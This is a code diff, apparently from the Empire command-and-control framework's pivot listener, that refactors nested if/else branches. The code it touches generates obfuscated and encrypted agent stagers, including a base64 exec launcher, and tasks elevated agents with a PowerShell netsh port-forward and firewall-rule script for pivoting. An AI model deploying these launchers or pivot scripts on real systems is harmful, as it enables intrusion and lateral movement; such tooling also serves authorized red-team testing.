@@ -242,9 +242,8 @@ class Listener:
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(stager, launcher)
-            else:
-                # otherwise return the case-randomized stager
-                return stager
+            # otherwise return the case-randomized stager
+            return stager
 
         if language.startswith("py"):
             # Python
@@ -350,8 +349,7 @@ class Listener:
                     "UTF-8"
                 )
                 return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
-            else:
-                return launcherBase
+            return launcherBase
 
         if language.startswith("csh"):
             workingHours = listenerOptions["WorkingHours"]["Value"]
@@ -381,16 +379,13 @@ class Listener:
                     f"{listenerName} csharpserver plugin not running"
                 )
                 return None
-            else:
-                return compiler.do_send_stager(
-                    stager_yaml, "Sharpire", confuse=obfuscate
-                )
 
-        else:
-            log.error(
-                "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
-            )
-            return None
+            return compiler.do_send_stager(stager_yaml, "Sharpire", confuse=obfuscate)
+
+        log.error(
+            "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def generate_stager(
         self,
@@ -472,13 +467,12 @@ class Listener:
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
-            else:
-                return stager
+            return stager
 
-        elif language.lower() == "python":
+        if language.lower() == "python":
             template_path = [
                 os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
@@ -510,15 +504,14 @@ class Listener:
                 # return an encrypted version of the stager ("normal" staging)
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
-            else:
-                # otherwise return the standard stager
-                return stager
 
-        else:
-            log.error(
-                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
-            return None
+            # otherwise return the standard stager
+            return stager
+
+        log.error(
+            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_agent(
         self,
@@ -579,7 +572,7 @@ class Listener:
 
             return code
 
-        elif language == "python":
+        if language == "python":
             if version == "ironpython":
                 f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
             else:
@@ -613,14 +606,14 @@ class Listener:
                 code = self.mainMenu.obfuscationv2.python_obfuscate(code)
                 code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
             return code
-        elif language == "csharp":
+        if language == "csharp":
             # currently the agent is stageless so do nothing
             return ""
-        else:
-            log.error(
-                "listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
-            return None
+
+        log.error(
+            "listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -631,46 +624,45 @@ class Listener:
         """
         host = listenerOptions["Host"]["Value"]
 
-        if language:
-            if language.lower() == "powershell":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/http.ps1")
-
-                template_options = {
-                    "session_cookie": self.session_cookie,
-                    "host": host,
-                }
-
-                return template.render(template_options)
-
-            elif language.lower() == "python":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/comms.py")
-
-                template_options = {
-                    "session_cookie": self.session_cookie,
-                    "host": host,
-                }
-
-                return template.render(template_options)
-
-            else:
-                log.error(
-                    "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
-                return None
-        else:
+        if not language:
             log.error("listeners/http generate_comms(): no language specified!")
             return None
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.ps1")
+
+            template_options = {
+                "session_cookie": self.session_cookie,
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        if language.lower() == "python":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/comms.py")
+
+            template_options = {
+                "session_cookie": self.session_cookie,
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def start(self):
         """
@@ -700,51 +692,196 @@ class Listener:
                     return False
 
                 # validate that the Listener does exist
-                if self.mainMenu.listenersv2.get_active_listener_by_name(listenerName):
-                    # check if a listener for the agent already exists
+                if not self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listenerName
+                ):
+                    log.error(f"{listenerName}: Listener does not exist")
+                    return False
 
-                    if self.mainMenu.listenersv2.get_active_listener_by_name(
-                        tempOptions["Name"]["Value"]
-                    ):
-                        log.error(
-                            f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
-                        )
-                        return False
+                # check if a listener for the agent already exists
+                if self.mainMenu.listenersv2.get_active_listener_by_name(
+                    tempOptions["Name"]["Value"]
+                ):
+                    log.error(
+                        f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
+                    )
+                    return False
 
-                    session_id = agent.session_id
-                    self.options["Agent"] = tempOptions["Agent"]
-                    if agent and agent.high_integrity:
-                        if agent.language.lower() in ["powershell", "csharp"]:
-                            # logic for powershell agents
-                            script = """
-                function Invoke-Redirector {
-                    param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-                    if($ShowAll){
-                        $out = netsh interface portproxy show all
-                        if($out){
-                            $out
+                session_id = agent.session_id
+                self.options["Agent"] = tempOptions["Agent"]
+                if not agent or not agent.high_integrity:
+                    log.error("Agent must be elevated to run a port forward pivot")
+                    return False
+
+                if agent.language.lower() in ["powershell", "csharp"]:
+                    # logic for powershell agents
+                    script = """
+        function Invoke-Redirector {
+            param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
+            if($ShowAll){
+                $out = netsh interface portproxy show all
+                if($out){
+                    $out
+                }
+                else{
+                    "[*] no redirectors currently configured"
+                }
+            }
+            elseif($Reset){
+                Netsh.exe advfirewall firewall del rule name="$FirewallName"
+                $out = netsh interface portproxy reset
+                if($out){
+                    $out
+                }
+                else{
+                    "[+] successfully removed all redirectors"
+                }
+            }
+            else{
+                if((-not $ListenPort)){
+                    "[!] netsh error: required option not specified"
+                }
+                else{
+                    $ConnectAddress = ""
+                    $ConnectPort = ""
+
+                    $parts = $ConnectHost -split(":")
+                    if($parts.Length -eq 2){
+                        # if the form is http[s]://HOST or HOST:PORT
+                        if($parts[0].StartsWith("http")){
+                            $ConnectAddress = $parts[1] -replace "//",""
+                            if($parts[0] -eq "https"){
+                                $ConnectPort = "443"
+                            }
+                            else{
+                                $ConnectPort = "80"
+                            }
                         }
                         else{
-                            "[*] no redirectors currently configured"
+                            $ConnectAddress = $parts[0]
+                            $ConnectPort = $parts[1]
                         }
                     }
-                    elseif($Reset){
-                        Netsh.exe advfirewall firewall del rule name="$FirewallName"
-                        $out = netsh interface portproxy reset
+                    elseif($parts.Length -eq 3){
+                        # if the form is http[s]://HOST:PORT
+                        $ConnectAddress = $parts[1] -replace "//",""
+                        $ConnectPort = $parts[2]
+                    }
+                    if($ConnectPort -ne ""){
+                        Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
+                        $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                         if($out){
                             $out
                         }
                         else{
-                            "[+] successfully removed all redirectors"
+                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                         }
                     }
                     else{
-                        if((-not $ListenPort)){
-                            "[!] netsh error: required option not specified"
-                        }
-                        else{
-                            $ConnectAddress = ""
-                            $ConnectPort = ""
+                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
+                    }
+                }
+            }
+        }
+        Invoke-Redirector"""
+
+                    script += " -ConnectHost {}".format(self.options["Host"]["Value"])
+                    script += " -ConnectPort {}".format(self.options["Port"]["Value"])
+                    script += " -ListenAddress {}".format(
+                        tempOptions["internalIP"]["Value"]
+                    )
+                    script += " -ListenPort {}".format(
+                        tempOptions["ListenPort"]["Value"]
+                    )
+                    script += f" -FirewallName {session_id}"
+
+                    for option in self.options:
+                        if option.lower() == "host":
+                            if self.options[option]["Value"].startswith("https://"):
+                                host = "https://{}:{}".format(
+                                    tempOptions["internalIP"]["Value"],
+                                    tempOptions["ListenPort"]["Value"],
+                                )
+                                self.options[option]["Value"] = host
+                            else:
+                                host = "http://{}:{}".format(
+                                    tempOptions["internalIP"]["Value"],
+                                    tempOptions["ListenPort"]["Value"],
+                                )
+                                self.options[option]["Value"] = host
+
+                    # check to see if there was a host value at all
+                    if "Host" not in list(self.options.keys()):
+                        self.options["Host"]["Value"] = host
+
+                    self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
+
+                    msg = "Tasked agent to install Pivot listener "
+                    self.mainMenu.agents.save_agent_log(
+                        tempOptions["Agent"]["Value"], msg
+                    )
+
+                    return True
+
+                if agent.language.lower() == "python":
+                    # not implemented
+                    script = """
+                    """
+
+                    log.error("Python pivot listener not implemented")
+                    return False
+
+                log.error("Unable to determine the language for the agent")
+        except Exception:
+            log.error(f'Listener "{name}" failed to start')
+            return False
+
+    def shutdown(self):
+        """
+        If a server component was started, implement the logic that kills the particular
+        named listener here.
+        """
+        name = self.options["Name"]["Value"]
+        self.instance_log.info(f"{name}: shutting down...")
+        log.info(f"{name}: shutting down...")
+
+        with SessionLocal() as db:
+            agent = self.mainMenu.agentsv2.get_by_name(db, name)
+
+            if not agent or not agent.high_integrity:
+                log.error("Agent is not present in the cache or not elevated")
+                return
+
+            if agent.language.startswith("po"):
+                script = """
+            function Invoke-Redirector {
+                param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
+                if($ShowAll){
+                    $out = netsh interface portproxy show all
+                    if($out){
+                        $out
+                    }
+                    else{
+                        "[*] no redirectors currently configured"
+                    }
+                }
+                elseif($Reset){
+                    Netsh.exe advfirewall firewall del rule name="$FirewallName"
+                    $out = netsh interface portproxy reset
+                    if($out){
+                        $out
+                    }
+                    else{
+                        "[+] successfully removed all redirectors"
+                    }
+                }
+                else{
+                    if((-not $ListenPort)){
+                        "[!] netsh error: required option not specified"
+                    }
+                    else{
+                        $ConnectAddress = ""
+                        $ConnectPort = ""
 
                             $parts = $ConnectHost -split(":")
                             if($parts.Length -eq 2){
@@ -786,163 +923,12 @@ class Listener:
                 }
                 Invoke-Redirector"""
 
-                            script += " -ConnectHost {}".format(
-                                self.options["Host"]["Value"]
-                            )
-                            script += " -ConnectPort {}".format(
-                                self.options["Port"]["Value"]
-                            )
-                            script += " -ListenAddress {}".format(
-                                tempOptions["internalIP"]["Value"]
-                            )
-                            script += " -ListenPort {}".format(
-                                tempOptions["ListenPort"]["Value"]
-                            )
-                            script += f" -FirewallName {session_id}"
+                script += " -Reset"
+                script += f" -FirewallName {agent.session_id}"
 
-                            for option in self.options:
-                                if option.lower() == "host":
-                                    if self.options[option]["Value"].startswith(
-                                        "https://"
-                                    ):
-                                        host = "https://{}:{}".format(
-                                            tempOptions["internalIP"]["Value"],
-                                            tempOptions["ListenPort"]["Value"],
-                                        )
-                                        self.options[option]["Value"] = host
-                                    else:
-                                        host = "http://{}:{}".format(
-                                            tempOptions["internalIP"]["Value"],
-                                            tempOptions["ListenPort"]["Value"],
-                                        )
-                                        self.options[option]["Value"] = host
+                self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
+                msg = "Tasked agent to uninstall Pivot listener "
+                self.mainMenu.agents.save_agent_log(agent.session_id, msg)
 
-                            # check to see if there was a host value at all
-                            if "Host" not in list(self.options.keys()):
-                                self.options["Host"]["Value"] = host
-
-                            self.mainMenu.agenttasksv2.create_task_shell(
-                                db, agent, script
-                            )
-
-                            msg = "Tasked agent to install Pivot listener "
-                            self.mainMenu.agents.save_agent_log(
-                                tempOptions["Agent"]["Value"], msg
-                            )
-
-                            return True
-
-                        elif agent.language.lower() == "python":
-                            # not implemented
-                            script = """
-                            """
-
-                            log.error("Python pivot listener not implemented")
-                            return False
-
-                        else:
-                            log.error("Unable to determine the language for the agent")
-                    else:
-                        log.error("Agent must be elevated to run a port forward pivot")
-                        return False
-        except Exception:
-            log.error(f'Listener "{name}" failed to start')
-            return False
-
-    def shutdown(self):
-        """
-        If a server component was started, implement the logic that kills the particular
-        named listener here.
-        """
-        name = self.options["Name"]["Value"]
-        self.instance_log.info(f"{name}: shutting down...")
-        log.info(f"{name}: shutting down...")
-
-        with SessionLocal() as db:
-            agent = self.mainMenu.agentsv2.get_by_name(db, name)
-
-            if not agent:
-                log.error("Agent is not present in the cache or not elevated")
-                return
-
-            if agent.high_integrity:
-                if agent.language.startswith("po"):
-                    script = """
-                function Invoke-Redirector {
-                    param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-                    if($ShowAll){
-                        $out = netsh interface portproxy show all
-                        if($out){
-                            $out
-                        }
-                        else{
-                            "[*] no redirectors currently configured"
-                        }
-                    }
-                    elseif($Reset){
-                        Netsh.exe advfirewall firewall del rule name="$FirewallName"
-                        $out = netsh interface portproxy reset
-                        if($out){
-                            $out
-                        }
-                        else{
-                            "[+] successfully removed all redirectors"
-                        }
-                    }
-                    else{
-                        if((-not $ListenPort)){
-                            "[!] netsh error: required option not specified"
-                        }
-                        else{
-                            $ConnectAddress = ""
-                            $ConnectPort = ""
-
-                                $parts = $ConnectHost -split(":")
-                                if($parts.Length -eq 2){
-                                    # if the form is http[s]://HOST or HOST:PORT
-                                    if($parts[0].StartsWith("http")){
-                                        $ConnectAddress = $parts[1] -replace "//",""
-                                        if($parts[0] -eq "https"){
-                                            $ConnectPort = "443"
-                                        }
-                                        else{
-                                            $ConnectPort = "80"
-                                        }
-                                    }
-                                    else{
-                                        $ConnectAddress = $parts[0]
-                                        $ConnectPort = $parts[1]
-                                    }
-                                }
-                                elseif($parts.Length -eq 3){
-                                    # if the form is http[s]://HOST:PORT
-                                    $ConnectAddress = $parts[1] -replace "//",""
-                                    $ConnectPort = $parts[2]
-                                }
-                                if($ConnectPort -ne ""){
-                                    Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
-                                    $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
-                                    if($out){
-                                        $out
-                                    }
-                                    else{
-                                        "[+] successfully added redirector on port $ListenPort to $ConnectHost"
-                                    }
-                                }
-                                else{
-                                    "[!] netsh error: host not in http[s]://HOST:[PORT] format"
-                                }
-                            }
-                        }
-                    }
-                    Invoke-Redirector"""
-
-                    script += " -Reset"
-                    script += f" -FirewallName {agent.session_id}"
-
-                    self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
-                    msg = "Tasked agent to uninstall Pivot listener "
-                    self.mainMenu.agents.save_agent_log(agent.session_id, msg)
-
-                elif agent.language.startswith("py"):
-                    log.error("Shutdown not implemented for python")
+            elif agent.language.startswith("py"):
+                log.error("Shutdown not implemented for python")
